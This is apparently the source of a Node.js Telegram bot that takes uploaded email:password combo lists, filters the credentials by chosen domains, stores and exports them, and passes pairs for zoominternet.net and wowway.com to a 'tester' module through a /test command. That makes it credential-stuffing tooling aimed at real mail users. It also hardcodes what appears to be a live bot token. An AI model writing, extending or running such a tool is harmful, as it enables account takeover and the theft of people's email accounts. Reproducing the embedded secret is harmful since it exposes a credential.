const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs-extra');

// Replace with your own token
const token = '7204135245:AAEw4EX0RgeAusxM1s_X9htB2bNt7rtGMnY';
const bot = new TelegramBot(token, { polling: true });

// File path for persistent storage
const DATA_FILE_PATH = './user_data.json';

// In-memory storage for user-specific data
let userStates = {};

// Load user data from file
const loadUserData = async () => {
    try {
        const data = await fs.readFile(DATA_FILE_PATH, 'utf-8');
        userStates = JSON.parse(data);
    } catch (error) {
        console.error('Failed to load user data:', error);
    }
};

// Save user data to file
const saveUserData = async () => {
    try {
        await fs.writeFile(DATA_FILE_PATH, JSON.stringify(userStates, null, 2));
    } catch (error) {
        console.error('Failed to save user data:', error);
    }
};

// Initialize user data if not present
const initUserData = (chatId) => {
    if (!userStates[chatId]) {
        userStates[chatId] = {
            defaultDomains: [],
            fileData: {},
            action: null,
            pendingActionData: {}
        };
    }
};

// Helper function to process the file content
const processFileContent = (content, domains) => {
    const lines = content.split('\n');
    const results = [];

    lines.forEach(line => {
        const [email, password] = line.split(':');
        if (email && password) {
            const domain = email.split('@')[1];
            if (domains.includes(domain)) {
                results.push({ email, password });
            }
        }
    });

    return results;
};

// Load user data on startup
loadUserData();

// Handle start command
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, "Welcome! Use /help to see available commands.");
    initUserData(chatId);
    saveUserData();
});

// Handle help command
bot.onText(/\/help/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, `
Available commands:
/start - Start the bot
/setdomain [domain] - Set a default domain
/removedomain [domain] - Remove a default domain
/listdomains - List all default domains
/setmode [custom|saved] - Set search mode
/export [domain|all] - Export results
/autosave [on|off] - Enable or disable auto-save mode
`);
    initUserData(chatId);
    saveUserData();
});

// Set default domain
bot.onText(/\/setdomain(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    if (match[1]) {
        const domains = match[1]
            .split(/[\s,]+/)
            .map(domain => domain.trim())
            .filter(domain => domain.includes('.'));

        if (domains.length > 0) {
            userStates[chatId].defaultDomains.push(...domains);
            bot.sendMessage(chatId, `Domains ${domains.join(', ')} added.`);
            saveUserData();
        } else {
            bot.sendMessage(chatId, "Invalid domain format. Please provide valid domains separated by commas or spaces.");
        }
    } else {
        userStates[chatId].action = 'setdomain';
        bot.sendMessage(chatId, "Please provide the domains you want to set, separated by commas or spaces.");
    }
});

// Remove default domain
bot.onText(/\/removedomain(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    if (match[1]) {
        const domain = match[1].trim();
        userStates[chatId].defaultDomains = userStates[chatId].defaultDomains.filter(d => d !== domain);
        bot.sendMessage(chatId, `Domain ${domain} removed.`);
        saveUserData();
    } else {
        userStates[chatId].action = 'removedomain';
        bot.sendMessage(chatId, "Please provide the domain you want to remove.");
    }
});

// List default domains
bot.onText(/\/listdomains/, (msg) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    const domains = userStates[chatId].defaultDomains;
    bot.sendMessage(chatId, `Default domains: ${domains.join(', ')}`);
});

// Set search mode
bot.onText(/\/setmode(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    if (match[1]) {
        const mode = match[1].trim();
        if (['custom', 'saved'].includes(mode)) {
            userStates[chatId].fileData.mode = mode;
            bot.sendMessage(chatId, `Mode set to ${mode}.`);
            saveUserData();
        } else {
            bot.sendMessage(chatId, "Invalid mode. Use 'custom' or 'saved'.");
        }
    } else {
        userStates[chatId].action = 'setmode';
        bot.sendMessage(chatId, "Please provide the mode you want to set ('custom' or 'saved').");
    }
});

// Enable or disable auto-save mode
bot.onText(/\/autosave(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    if (match[1]) {
        const autoSave = match[1].trim().toLowerCase();
        if (['on', 'off'].includes(autoSave)) {
            userStates[chatId].fileData.autoSave = autoSave === 'on';
            bot.sendMessage(chatId, `Auto-save mode ${autoSave === 'on' ? 'enabled' : 'disabled'}.`);
            saveUserData();
        } else {
            bot.sendMessage(chatId, "Invalid option. Use 'on' or 'off'.");
        }
    } else {
        userStates[chatId].action = 'autosave';
        bot.sendMessage(chatId, "Please provide the auto-save mode ('on' or 'off').");
    }
});

// File upload handler
bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    const fileId = msg.document.file_id;

    try {
        // Download the file
        const file = await bot.getFile(fileId);
        const fileStream = bot.getFileStream(fileId);
        const filePath = `./downloads/${msg.document.file_name}`;

        // Save the file
        const writeStream = fs.createWriteStream(filePath);
        fileStream.pipe(writeStream);

        writeStream.on('finish', async () => {
            // Read and process the file
            const content = await fs.readFile(filePath, 'utf-8');
            const mode = userStates[chatId].fileData.mode || 'custom';
            const domains = mode === 'saved' ? userStates[chatId].defaultDomains : userStates[chatId].fileData.domains || [];

            if (domains.length === 0) {
                return bot.sendMessage(chatId, "No domains specified.");
            }

            const results = processFileContent(content, domains);

            // Save results for later
            userStates[chatId].fileData.results = [...userStates[chatId].fileData.results, ...results];

            // Count results for each domain
            const domainCounts = {};
            results.forEach(result => {
                const domain = result.email.split('@')[1];
                if (!domainCounts[domain]) {
                    domainCounts[domain] = 0;
                }
                domainCounts[domain]++;
            });

            if (userStates[chatId].fileData.autoSave) {
                bot.sendMessage(chatId, `Results saved. Extracted ${results.length} email-password pairs.`);
            } else {
                // Output results immediately
                let resultMessage = results.map(result => `${result.email}:${result.password}`).join('\n');
                let countsMessage = Object.entries(domainCounts).map(([domain, count]) => `${domain}: ${count} result(s)`).join('\n');
                bot.sendMessage(chatId, `Results:\n${resultMessage}\n\nCounts:\n${countsMessage}`);
            }

            // Save user data after processing
            saveUserData();
        });
    } catch (error) {
        console.error('Failed to handle document upload:', error);
        bot.sendMessage(chatId, "Failed to process the uploaded file.");
    }
});

// Export results
bot.onText(/\/export(?: (.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    if (match[1]) {
        const domain = match[1].trim();
        const results = userStates[chatId].fileData.results || [];

        let exportResults = results;
        if (domain !== 'all') {
            exportResults = results.filter(result => result.email.endsWith(`@${domain}`));
        }

        const exportContent = exportResults.map(result => `${result.email}:${result.password}`).join('\n');
        const exportPath = `./exports/results_${chatId}.txt`;

        fs.writeFile(exportPath, exportContent)
            .then(() => {
                bot.sendDocument(chatId, exportPath);
            })
            .catch(error => {
                console.error('Failed to export results:', error);
                bot.sendMessage(chatId, "Failed to export results.");
            });
    } else {
        bot.sendMessage(chatId, "Please specify a domain to export results for, or 'all' to export all results.");
    }
});


function getEmailPasswordPairs(domain, chatId) {
    const userData = userStates[chatId];
    if (!userData) return null;

    const results = userData.fileData.results || [];
    const domainResults = results.filter(result => result.email.endsWith(`@${domain}`));

    return domainResults.map(result => ({ email: result.email, password: result.password }));
}

const { test } = require('./tester');

bot.onText(/\/test (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const domain = match[1];

    // Get email-password pairs for the specified domain
    const emailPasswordList = getEmailPasswordPairs(domain, chatId);

    if (emailPasswordList) {
        let option;
        if (domain === 'zoominternet.net') {
            option = 1; // Option 1 for zoominternet.net
        } else if (domain === 'wowway.com') {
            option = 0; // Option 0 for wowway.com
        } else {
            bot.sendMessage(chatId, `Domain ${domain} is not supported.`);
            return;
        }

        // Test the email-password pairs for the specified domain
        await test(option, emailPasswordList, bot, chatId);
        bot.sendMessage(chatId, `Testing email-password pairs for domain ${domain}.`);
    } else {
        bot.sendMessage(chatId, `Domain ${domain} is not supported.`);
    }
});


// Handle text input for domains and modes
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    initUserData(chatId);
    const userState = userStates[chatId];
    
    if (userState.action) {
        const input = msg.text.trim();
        switch (userState.action) {
            case 'setdomain':
                const domains = input.split(/[\s,]+/).map(domain => domain.trim()).filter(domain => domain.includes('.'));
                if (domains.length > 0) {
                    userState.defaultDomains.push(...domains);
                    bot.sendMessage(chatId, `Domains ${domains.join(', ')} added.`);
                } else {
                    bot.sendMessage(chatId, "Invalid domain format. Please provide valid domains separated by commas or spaces.");
                }
                break;

            case 'removedomain':
                userState.defaultDomains = userState.defaultDomains.filter(d => d !== input);
                bot.sendMessage(chatId, `Domain ${input} removed.`);
                break;

            case 'setmode':
                if (['custom', 'saved'].includes(input)) {
                    userState.fileData.mode = input;
                    bot.sendMessage(chatId, `Mode set to ${input}.`);
                } else {
                    bot.sendMessage(chatId, "Invalid mode. Use 'custom' or 'saved'.");
                }
                break;

            case 'autosave':
                if (['on', 'off'].includes(input.toLowerCase())) {
                    userState.fileData.autoSave = input.toLowerCase() === 'on';
                    bot.sendMessage(chatId, `Auto-save mode ${input.toLowerCase() === 'on' ? 'enabled' : 'disabled'}.`);
                } else {
                    bot.sendMessage(chatId, "Invalid option. Use 'on' or 'off'.");
                }
                break;
        }
        userState.action = null;
        saveUserData();
    }
});
